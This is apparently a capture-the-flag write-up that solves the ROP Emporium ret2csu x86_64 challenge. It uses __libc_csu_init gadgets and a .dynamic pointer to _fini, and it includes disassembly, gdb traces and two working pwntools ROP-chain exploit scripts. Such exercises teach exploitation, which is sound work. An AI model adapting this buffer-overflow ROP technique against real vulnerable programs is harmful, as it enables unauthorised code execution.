---
Title: Ropemporium x86_64 ret2csu
Date: 2023-06-08
Tags: [linux, pwn, python, ROP, x86_64, ropemporium]
Categories: [write-up]
Author: cdpointpoint
---

# ret2csu

## Introduction

As an introduction we can read we can read the description in the [ropemporium site](https://ropemporium.com/challenge/ret2csu.htm)

### Same same, but different

This challenge is very similar to "callme", with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the "callme" challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM & MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.

Populating the elusive 3rd register using ROP can prove more difficult than you might expect, especially in smaller binaries with fewer gadgets. This can become particularly irksome since many useful GLIBC functions require three arguments.
So little room for activities

Start by using ropper to search for sensible gadgets, if there's no pop rdx for example, perhaps there's a mov rdx, rbp that you could chain with a pop rbp. If you're all out of ideas go ahead and read the last paragraph.
Universal

Fortunately some very smart people have come up with a solution to your problem and as is customary in infosec given it a collection of pretentious names, including "Universal ROP", "μROP", "return-to-csu" or just "ret2csu". You can learn all you need to on the subject from this BlackHat Asia paper. Note that more recent versions of gcc may use different registers from the example in __libc_csu_init(), including the version that compiled this challenge.


## Discovery

### Executing program

```sh
08_ret2csu$ ./ret2csu
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> OKOK
Thank you!
```


## Analyse

Looking at the program ret2csu :

```sh
[0x004005d0]> pdf @sym.main
            ; DATA XREF from entry0 @ 0x40053d
┌ 16: int main (int argc, char **argv, char **envp);
│           0x00400607      55             push rbp
│           0x00400608      4889e5         mov rbp, rsp
│           0x0040060b      e8f0feffff     call sym.imp.pwnme
│           0x00400610      b800000000     mov eax, 0
│           0x00400615      5d             pop rbp
└           0x00400616      c3             ret
```
The main function call an imported pwnme function.

A embeded but not called function call ret2win wit bad parameters

```sh
[0x004005d0]> pdf @ sym.usefulFunction
┌ 27: sym.usefulFunction ();
│           0x00400617      55             push rbp
│           0x00400618      4889e5         mov rbp, rsp
│           0x0040061b      ba03000000     mov edx, 3
│           0x00400620      be02000000     mov esi, 2
│           0x00400625      bf01000000     mov edi, 1
│           0x0040062a      e8e1feffff     call sym.imp.ret2win
│           0x0040062f      90             nop
│           0x00400630      5d             pop rbp
└           0x00400631      c3             ret
```


``` sh
[0x004005e0]> pdf @sym.__libc_csu_init
            ; DATA XREF from entry0 @ 0x400536
┌ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
│           ; arg int64_t arg1 @ rdi
│           ; arg int64_t arg2 @ rsi
│           ; arg int64_t arg3 @ rdx
│           0x00400640      4157           push r15
│           0x00400642      4156           push r14
│           0x00400644      4989d7         mov r15, rdx                ; arg3
│           0x00400647      4155           push r13
│           0x00400649      4154           push r12
│           0x0040064b      4c8d259e0720.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start
│                                                                      ; 0x600df0
│           0x00400652      55             push rbp
│           0x00400653      488d2d9e0720.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
│                                                                      ; 0x600df8
│           0x0040065a      53             push rbx
│           0x0040065b      4189fd         mov r13d, edi               ; arg1
│           0x0040065e      4989f6         mov r14, rsi                ; arg2
│           0x00400661      4c29e5         sub rbp, r12
│           0x00400664      4883ec08       sub rsp, 8
│           0x00400668      48c1fd03       sar rbp, 3
│           0x0040066c      e85ffeffff     call sym._init
│           0x00400671      4885ed         test rbp, rbp
│       ┌─< 0x00400674      7420           je 0x400696
│       │   0x00400676      31db           xor ebx, ebx
│       │   0x00400678      0f1f84000000.  nop dword [rax + rax]
│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400694
│      ┌──> 0x00400680      4c89fa         mov rdx, r15
│      ╎│   0x00400683      4c89f6         mov rsi, r14
│      ╎│   0x00400686      4489ef         mov edi, r13d
│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
│      ╎│   0x0040068d      4883c301       add rbx, 1
│      ╎│   0x00400691      4839dd         cmp rbp, rbx
│      └──< 0x00400694      75ea           jne 0x400680
│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
│       └─> 0x00400696      4883c408       add rsp, 8
│           0x0040069a      5b             pop rbx
│           0x0040069b      5d             pop rbp
│           0x0040069c      415c           pop r12
│           0x0040069e      415d           pop r13
│           0x004006a0      415e           pop r14
│           0x004006a2      415f           pop r15
└           0x004006a4      c3             ret
```


with this pseudo gadget :

``` sh
0x00400680      4c89fa         mov rdx, r15
0x00400683      4c89f6         mov rsi, r14
0x00400686      4489ef         mov edi, r13d
0x00400689      41ff14dc       call qword [r12 + rbx*8]
```

we can call : [r12 + rbx*8] and previouslely set r12 and rbx as we want.

Unfortunatly the gadjet donc call r12 + rbx*8 but [r12 + rbx*8].

We need an address CONTAING our target : 0x00400510 (ret2win@plt)

The is no addess ad hoc.

Here is a tricks : find an addresse containing a "ret" gadget address,
or relatively neutral gadget.

Its the case of the ._fini function

``` sh
┌ 9: sym._fini ();
│           0x004006b4      4883ec08       sub rsp, 8                  ; [14] -r-x section size 9 named .fini
│           0x004006b8      4883c408       add rsp, 8
└           0x004006bc      c3             ret
```

This function referenced in .DYNAMIC section

``` sh
[0x00600e00]> pd 10 @ sym..dynamic
            ;-- section..dynamic:
            ;-- .dynamic:
            0x00600e00      .qword 0x0000000000000001                  ; [20] -rw- section size 496 named .dynamic
            0x00600e08      .qword 0x0000000000000001
            0x00600e10      .qword 0x0000000000000001
            0x00600e18      .qword 0x0000000000000038
            0x00600e20      .qword 0x000000000000001d
            0x00600e28      .qword 0x0000000000000078
            0x00600e30      .qword 0x000000000000000c
            0x00600e38      .qword 0x00000000004004d0 ; section..init ; sym._init ; sym..init
            0x00600e40      .qword 0x000000000000000d
ici ====>   0x00600e48      .qword 0x00000000004006b4 ; section..fini ; sym._fini ; sym..fini
```


Then if or "r12 + rbx*8" give 0x00600e48 the call will do :
``` sh
sub rsp, 8
add rsp, 8 : nothing
ret        : return in libc_csu_init
```

Try it withis chaine:

|address   | comment |
|----------|--------------|
|0x0040069a | gadget 1 |
| 0x0  | rbp |
| 0x0  | rbp |
|0x0600e48 | r12 : .dynamics + 48 => @.fini|
|0xdeadbeefdeadbeef | r13 |
|0xcafebabecafebabe | r14 |
|0xd00df00dd00df00d | r14 |
|0x00400680 | gadget_2 |
|0x00400510 | ret2win@plt |

with this python script :


``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break a le fin de pwnme
gs='''
b *pwnme+150
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('ret2csu')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x28

ret2win=elf.plt['ret2win']

g_poprdi=0x004006a3
gadget_1=0x0040069a
gadget_2=0x00400680


io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)


PL =b"A"*offset
PL+=p64(gadget_1)
PL+=p64(0x0)                 # rbx
PL+=p64(0x0)                   # rbp
PL+=p64(0x0600e48)           # r12 = .dynamic+48
PL+=p64(0xdeadbeefdeadbeef)  # r13
PL+=p64(0xcafebabecafebabe)  # r14
PL+=p64(0xd00df00dd00df00d)  # r15
PL+=p64(gadget_2)

io.sendline(PL)
io.interactive()
```

Breaking in gdb in *pwnme + 150.

Then type "ni 22" to execute 22 instructions

``` sh
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fff8359e398│+0x0000: 0x0000000000000a ("\n"?)	 ← $rsp
0x007fff8359e3a0│+0x0008: 0x0000000000000000
0x007fff8359e3a8│+0x0010: 0x0000000000000000
0x007fff8359e3b0│+0x0018: 0x5af722b7590cce05
0x007fff8359e3b8│+0x0020: 0x58f4469f064ace05
0x007fff8359e3c0│+0x0028: 0x0000000000000000
0x007fff8359e3c8│+0x0030: 0x0000000000000000
0x007fff8359e3d0│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400680 <__libc_csu_init+64> mov    rdx, r15
     0x400683 <__libc_csu_init+67> mov    rsi, r14
     0x400686 <__libc_csu_init+70> mov    edi, r13d
 →   0x400689 <__libc_csu_init+73> call   QWORD PTR [r12+rbx*8]
     0x40068d <__libc_csu_init+77> add    rbx, 0x1
     0x400691 <__libc_csu_init+81> cmp    rbp, rbx
     0x400694 <__libc_csu_init+84> jne    0x400680 <__libc_csu_init+64>
     0x400696 <__libc_csu_init+86> add    rsp, 0x8
     0x40069a <__libc_csu_init+90> pop    rbx
────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*[r12+rbx*8] (
   $rdi = 0x000000deadbeef,
   $rsi = 0xcafebabecafebabe,
   $rdx = 0xd00df00dd00df00d
)
```

Damned ! rdi is not completely loaded  by mov edi, r13d

    ni again :

We have to execute correctly the end of the csu_init function :

``` sh
│      ╎│   0x0040068d      4883c301       add rbx, 1
│      ╎│   0x00400691      4839dd         cmp rbp, rbx
│      └──< 0x00400694      75ea           jne 0x400680
│       └─> 0x00400696      4883c408       add rsp, 8
│           0x0040069a      5b             pop rbx
│           0x0040069b      5d             pop rbp
│           0x0040069c      415c           pop r12
│           0x0040069e      415d           pop r13
│           0x004006a0      415e           pop r14
│           0x004006a2      415f           pop r15
└           0x004006a4      c3             ret
```
But it'snt all folks !.
We have to finish the function csu_init to  continue our ropchain.

1. There is a bad jump to 0x400680 if rpb != rbp+1
We will set rbx=0 and rbp=1
2. rsp is incremented by one word.
We will put a junk entry on the stack
3. We need 6 values on the stack before the final ret
4. Add a pop rdi gadget for a complete value.
5. ret2win !

|address   | comment |
|----------|--------------|
|0x0040069a | gadget 1 |
| 0x0  | rbx |
| 0x1  | rbp == rbx + 1 |
|0x0600e48 | r12 : .dynamics + 48 => @.fini|
|0xdeadbeefdeadbeef | r13 |
|0xcafebabecafebabe | r14 |
|0xd00df00dd00df00d | r14 |
|0x00400680 | gadget_2 |
|0x00400510 | ret2win@plt |
|0 | junk for add rsp,8 |
|1 | pop rbx |
|2 | pop rbp |
|3 | pop r12 |
|4 | pop r13 |
|5 | pop r14 |
|6 | pop r15 |
|0x004006a3 | pop rdi |
|0xdeadbeefdeadbeef | rdi |
|0x00400510 | ret2win@plt |


The python script :
``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break a le fin de pwnme
gs='''
b *pwnme+150
b *ret2win
c
'''


# Set up pwntools for the correct architecture
elf =  ELF('ret2csu')
context.binary=elf
# context(terminal=['tmux'])

# Offset avant ecrasement de l'adresse de retour
offset=0x28

ret2win=elf.plt['ret2win']

g_poprdi=0x004006a3
gadget_1=0x0040069a
gadget_2=0x00400680


io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p64(gadget_1)
PL+=p64(0x0)                 # rbx
PL+=p64(1)                   # rbp == rbx + 1
PL+=p64(0x0600e48)           # r12
PL+=p64(0xdeadbeefdeadbeef)  # r13
PL+=p64(0xcafebabecafebabe)  # r14
PL+=p64(0xd00df00dd00df00d)  # r15
PL+=p64(gadget_2)
PL+=p64(0)
PL+=p64(1)
PL+=p64(2)
PL+=p64(3)
PL+=p64(4)
PL+=p64(5)
PL+=p64(6)
PL+=p64(g_poprdi)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0x00400510)

io.sendline(PL)
io.interactive()
```

### script execution

Use it first in debug mode in gdb ( -d ).

Ther is an initial break point in *pwnme+150 at the end of the function and a second bp on ret2win start

Then follow the rop with ni or contiue instructions.

Else, executign or script without debug :

``` sh
08_ret2csu# python3 solve.py
[*] '/w/ropemporium/x64/08_ret2csu/ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/w/ropemporium/x64/08_ret2csu/ret2csu': pid 175
[*] Switching to interactive mode
[*] Process '/w/ropemporium/x64/08_ret2csu/ret2csu' stopped with exit code 0 (pid 175)
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```










